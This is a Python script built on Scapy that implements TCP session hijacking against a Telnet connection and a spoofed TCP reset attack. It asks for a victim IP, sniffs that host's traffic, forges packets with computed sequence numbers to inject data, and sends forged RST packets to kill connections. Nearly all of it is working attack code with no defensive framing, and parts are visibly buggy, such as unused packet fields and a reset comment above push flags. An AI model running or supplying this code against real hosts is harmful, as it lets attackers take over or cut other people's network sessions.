#!/usr/bin/env python3

from scapy.all import *
import binascii

class tcp_session_hijack:
	def auto_attack(dport):
		victim_ip = input("Enter Target IP: ")
		#cmd = input("Command to inject: ")
		hostname = socket.gethostname()    
		IPAddr = socket.gethostbyname(hostname)   
		win = 512
		try:
			# get a tcp packet by sniffing network
			t = []
			while (len(t) == 0):
				print("Sniffing for source")
				t = sniff(iface='Ethernet0', count=1, lfilter=lambda x: x.haslayer(TCP) and x[IP].src == victim_ip and x[IP].dport == dport)
			print("Packets found")
			t = t[0]
			#print("Sniffing for response packets")
			#s = sniff(iface='Ethernet0', count=1, lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == victim_ip and x[IP].dport == tcpdata['sport'])
			# determine next sequence
			ip_total_len = t[IP].len
			ip_header_len = t[IP].ihl * 32 / 8
			tcp_header_len = t[IP].dataofs * 32 / 8
			tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
			# build IP paacket
			IP_Packet = IP()
			IP_Packet.src = t[IP].src
			IP_Packet.dst = t[IP].dst
			TCP_Packet = TCP()	
			# from destination port
			TCP_Packet.sport = int(t[TCP].sport)
			# to originating port
			TCP_Packet.dport = int(t[TCP].dport)
			# set reset
			TCP_Packet.load = b'hostname'
			TCP_Packet.flags = 'PA'
			# ok so packet sequence etc is very important, but what if we maipulate that sequence to be something we want?
			TCP_Packet.window = t[TCP].window
			t[TCP].load = b'\r\n'
			t[TCP].seq = int(t[TCP].seq + tcp_seg_len)
			# packet sequence number and len needs to come from server side!	
			TCP_Packet.seq = int(t[TCP].seq + tcp_seg_len)
			#send(IP_Packet/TCP_Packet, verbose=False)
			send(IP_Packet/t[TCP], verbose=False)
			sys.stdout.write("Injection packet sent!\n")
			input("Press enter to exit")
		except Exception as e:
			print(e)
			input("Press any key to coninue...")
		except KeyboardInterrupt:
			print ("Ended reset attack")
			input("Press any key to continue...")

	def auto_rst_conn(s):
		win = 512
		ip_total_len = s[IP].len
		ip_header_len = s[IP].ihl * 32 / 8
		tcp_header_len = s[IP].dataofs * 32 / 8
		tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
		IP_Packet = IP()
		# spoof resposne is from dest
		IP_Packet.src = s[IP].src
		# to sender
		IP_Packet.dst = s[IP].dst
		TCP_Packet = TCP()	
		# from destination port
		TCP_Packet.sport = int(s[TCP].sport)
		# to originating port
		TCP_Packet.dport = int(s[TCP].dport)
		# set reset
		TCP_Packet.flags = 'R'
		# ok so packet sequence etc is very important, but what if we maipulate that sequence to be something we want?
		TCP_Packet.window = win
		# packet sequence number and len needs to come from server side!	
		TCP_Packet.seq = int(s[TCP].seq + tcp_seg_len)
		send(IP_Packet/TCP_Packet, verbose=False)
		sys.stdout.write("Reset packet sent!\n")

	def execute():
		 tcp_session_hijack.auto_attack(23)
